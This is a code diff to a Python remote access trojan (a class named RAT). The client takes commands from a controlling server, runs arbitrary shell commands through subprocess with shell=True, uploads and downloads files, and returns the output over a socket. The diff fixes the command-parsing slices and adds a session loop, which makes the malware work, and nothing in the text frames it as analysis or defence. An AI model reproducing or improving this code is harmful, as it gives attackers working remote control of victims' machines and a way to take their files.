@@ -122,7 +122,8 @@ class RAT:
 	BUFFER = 1024
 	SHORT_INTERVAL = 0.1
 	MID_INTERVAL = 0.8
-	LONG_INTERAL = 10
+	S_INTERVAL = 3
+	LONG_INTERVAL = 10
 
 	SIG = "ACTIVE"
 	ACK_SIG = "0x06"
@@ -221,33 +222,39 @@ class RAT:
 				data = cls.receive()
 				if(data == cls.SIG):
 					cls.FLAG = True
-					cls.send("\n" + os.getcwd() + "> ")
+					cls.send("\n" + os.getcwd() + ">")
 
-				# check for quit
-				if(data == 'quit' or data == 'terminate'):
-					cls.send('Quitted...')
-					break;
-				# check for change directory
-				elif(data.startswith('cd ')):
-					os.chdir(data[len(data):])
-					stdoutput = ""
-				# check for download
-				elif(data.startswith('download ')):
-					stdoutput = upload(data[len(data):])
-				# check for upload
-				elif(data.startswith('upload ')):
-					stdoutput = download(data[len(data):])
-				
+				while(cls.FLAG):
 
-				else:
-					proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-					stdoutput = proc.stdout.read() + proc.stderr.read()
+					data = cls.receive()
+					# check for quit
+					if(data == 'quit' or data == 'terminate'):
+						cls.send('Quitted...')
+						break;
+					# check for change directory
+					elif(data.startswith('cd ')):
+						os.chdir(data[3:])
+						stdoutput = ""
+					# check for download
+					elif(data.startswith('download ')):
+						stdoutput = upload(data[9:])
+					# check for upload
+					elif(data.startswith('upload ')):
+						stdoutput = download(data[7:])
+					
 
-				# Send data to server
-				stdoutput += "\n" + os.getcwd() + "> "
-				stdoutput = stdoutput.decode('gbk').encode('utf-8')
-				cls.send(stdoutput)
+					else:
+						proc = subprocess.Popen(data, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+						stdoutput = proc.stdout.read() + proc.stderr.read()
 
+					# Send data to server
+					stdoutput += "\n" + os.getcwd() + "> "
+					stdoutput = stdoutput.decode('gbk').encode('utf-8')
+					cls.send(stdoutput)
+
+				if(data == 'terminate'):
+					break
+					time.sleep(cls.S_INTERVAL)
 
 			except socket.error as e:
 				# Connection refused
